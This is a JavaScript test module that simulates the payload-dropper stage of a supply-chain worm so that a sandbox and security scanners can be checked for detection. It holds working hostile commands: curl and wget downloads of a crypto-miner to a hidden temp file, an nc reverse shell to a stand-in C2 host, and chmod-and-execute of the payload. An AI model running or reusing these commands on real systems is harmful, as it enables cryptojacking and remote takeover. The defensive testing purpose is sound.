/**
 * SHAI-HULUD SIMULATION - Stage 4: Payload Dropper
 * ⚠️ TEST ONLY - Simulates second-stage malware download
 * 
 * Techniques simulated:
 * - curl/wget to download bitcoin miner binary
 * - Fallback across multiple download tools
 * - Known malware hosting patterns (pool URLs, raw GitHub, paste sites)
 * - chmod +x and execution of downloaded payload
 * 
 * SIGNALS THIS SHOULD TRIGGER:
 * - Sandbox: blocked_execution (curl, wget, nc)
 * - GuardDog: download-executable, shell-command-execution
 * - Semgrep: CWE-78 (command injection)
 */

'use strict';

const { execSync } = require('child_process');
const path = require('path');
const os = require('os');

// Known malware drop sites / crypto mining pools
// Using .test TLD (RFC 2606) - guaranteed not to resolve
const DROP_URLS = [
    'https://pool.cryptomine-xmr.test/bin/xmrig-linux-arm64',
    'https://raw.githubusercontent.test/threat-actor/cryptojack/main/miner',
    'https://paste.evil-cdn.test/raw/aB3kF9/payload.sh',
    'https://dl.malware-hosting.test/bins/reverse-shell-arm64',
];

const DROP_PATH = path.join(os.tmpdir(), '.cache', '.node_update');

/**
 * Attempt to download second-stage payload using system tools.
 * Real attacks chain: curl → wget → nc → python → node fetch
 */
function downloadPayload() {
    const url = DROP_URLS[0];

    console.log('[SIMULATION] Stage 4: Attempting second-stage payload download');

    // --- Attempt 1: curl (most common) ---
    try {
        console.log('[SIMULATION] Trying curl...');
        execSync(`curl -fsSL -o ${DROP_PATH} ${url}`, {
            timeout: 10000,
            stdio: ['ignore', 'pipe', 'pipe']
        });
        console.log('[SIMULATION] curl download succeeded');
        return true;
    } catch (e) {
        console.log('[SIMULATION] curl failed:', e.message?.substring(0, 80));
    }

    // --- Attempt 2: wget ---
    try {
        console.log('[SIMULATION] Trying wget...');
        execSync(`wget -q -O ${DROP_PATH} ${url}`, {
            timeout: 10000,
            stdio: ['ignore', 'pipe', 'pipe']
        });
        console.log('[SIMULATION] wget download succeeded');
        return true;
    } catch (e) {
        console.log('[SIMULATION] wget failed:', e.message?.substring(0, 80));
    }

    // --- Attempt 3: netcat reverse shell fallback ---
    try {
        console.log('[SIMULATION] Trying nc reverse shell...');
        execSync(`nc -e /bin/sh c2.shai-hulud-attack.test 4444`, {
            timeout: 5000,
            stdio: ['ignore', 'pipe', 'pipe']
        });
        return true;
    } catch (e) {
        console.log('[SIMULATION] nc failed:', e.message?.substring(0, 80));
    }

    console.log('[SIMULATION] All download methods blocked — sandbox working correctly');
    return false;
}

/**
 * Make downloaded payload executable and run it.
 * This stage only fires if download succeeds (it shouldn't in sandbox).
 */
function executePayload() {
    try {
        execSync(`chmod +x ${DROP_PATH} && ${DROP_PATH} --donate-level 1 --url pool.cryptomine-xmr.test:3333`, {
            timeout: 5000,
            stdio: 'ignore'
        });
    } catch (e) {
        // Expected to fail
    }
}

module.exports = {
    downloadPayload,
    executePayload,
    DROP_URLS,
    DROP_PATH
};
